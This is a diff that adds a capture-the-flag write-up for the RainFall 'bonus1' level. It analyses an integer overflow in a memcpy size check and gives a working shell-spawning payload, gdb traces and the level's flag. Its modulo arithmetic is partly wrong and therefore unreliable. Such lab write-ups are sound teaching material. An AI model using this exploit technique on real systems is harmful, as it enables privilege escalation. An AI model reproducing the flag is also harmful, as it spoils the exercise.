@@ -1,17 +1,117 @@
+# Bonus 1
 
-overflow size_t in memcpy, possible because we are on 32 bits system
+## General Informations 
 
-max int on 32 bits: [2147483647 - 2147483648]
-max size_t on 32 bits: [0 - 4294967295]
+**Path** : `/home/user/bonus1/bonus1` </br>
+**File** : 
+```
+bonus1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5af8fd13428afc6d05de1abfa9d7e7621df174c7, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1`
 
-=> We need a number < 10 with atoi 
+## Static Analysis
 
-=> We can overflow the memcpy -> we are on 32 bits system  
+After decompiling the binary in ghidra, we get the pseudo code below: 
 
--> max size_t / 4 = (4294967295 / 4) = 1073741823.75 => 
--> (-1073741822 * 4) % 4294967295 = we can write 8 bytes
--> (-1073741809 * 4) % 4294967295 = we can write 60 bytes
+```
+undefined4 main(undefined4 param_1,int param_2)
+{
+  undefined4 uVar1;
+  undefined1 local_3c [40];
+  int local_14;
+  
+  local_14 = atoi(*(char **)(param_2 + 4));
+  if (local_14 < 10) {
+    memcpy(local_3c,*(void **)(param_2 + 8),local_14 * 4);
+    if (local_14 == 0x574f4c46) {
+      execl("/bin/sh","sh",0);
+    }
+    uVar1 = 0;
+  }
+  else {
+    uVar1 = 1;
+  }
+  return uVar1;
+}
+```
 
-=> fuzzing ret addr main-> "AAAA"*14 + "BBBB"  (payload length: 60)
+- `main`
+    - Calls `atoi` on the first argument and checks if it’s a number less than 10
+    - If it is, it copies the second argument into a buffer. The number of bytes copied is equal to the first argument multiplied by 4, which seems interesting
+    - Then, it compares a local integer `local_14` to a specific value: `0x574f4c46`, If the values are equal then a shell is executed
+    - Finally, it returns 0 or 1 depending on the result of the comparison
 
-./bonus1 -1073741809 `python  -c 'print "AABB"*14 + "\x82\x84\x04\x08"'`
+
+## Vulnerability found 
+
+
+The vulnerability lies in the arguments passed to `memcpy`. </br>
+
+The third argument of memcpy is of type `size_t`, which has a maximum value of `4294967295` on a 32-bit architecture. </br>
+During the `memcpy` call, the first argument (an int) is multiplied by 4. The issue is that we can cause a size overflow by passing a negative value as input. </br>
+
+For example, if we take the maximum `size_t` value divided by 4 `4294967295 / 4 = 1073741823`, and then pass that as a negative value (-1073741823), we get: `-1073741823 * 4 = -4294967292`. Converted to a `size_t`, we get `-4294967292 % 4294967295 = 3`, 3 bytes. So only 4 bytes are copied — nothing dangerous so far. </br>
+
+But if we decrease the input slightly, for example by 10 `-1073741813`, `(-1073741813 * 4) % 4294967295 = −4294967252 % 4294967295 = 43` - Now we’re copying 44 bytes instead of the expected max of 10, and 4 extra bytes after the buffer. </br>
+
+This bypasses the original limit and allows us to overflow the buffer with a larger payload.
+
+
+## Dynamic Analysis
+
+We put a breakpoint after the `memcpy` and run the program with the values tested above:
+```
+(gdb) b *0x08048478
+(gdb) r -1073741813 `python -c 'print "A"*43 + "B"'`
+(gdb) x/50x $esp 
+...
+0xbffff5c0:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
+0xbffff5d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff5e0:	0x41414141	0x41414141	0x41414141	0x42414141 <- "AAAB"
+...
+```
+
+The value `-1073741813` allows us to copy 44 bytes instead of 10. </br>
+
+After the `memcpy` call, there's a comparison instruction to determine whether to launch the shell. If we examine the value being compared, we can see it matches the last 4 bytes of our payload, which are `AAAB` — corresponding to the magic value `0x574f4c46`.
+
+```
+0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
+(gdb) x $esp + 0x3c
+0xbffff5ec:	0x42414141
+```
+
+If we set the last 4 bytes by `0x574f4c46`, it should pass the condition:
+```
+(gdb) r -1073741813 `python -c 'print "A"*40 + "\x46\x4c\x4f\x57"'`
+(gdb) c
+...
+process 6690 is executing new program: /bin/dash
+$ 
+```
+It works as expected ! The shell is executed.
+
+## Payload construction 
+
+First, we pick a value allowing us to write more than 40 bytes by `memcpy`:
+```
+-1073741813 `python -c 'print "A"*43 + "B"`
+```
+Then we overwrite the last 4 bytes following the buffer by `0x574f4c46`:
+```
+-1073741813 `python -c 'print "A"*40 + "\x46\x4c\x4f\x57"'`
+```
+
+## Demonstration 
+
+```
+bonus1@RainFall:~$ ./bonus1 -1073741813 `python -c 'print "A"*40 + "\x46\x4c\x4f\x57"'`
+$ whoami
+bonus2
+```
+
+## Flag 
+
+```
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
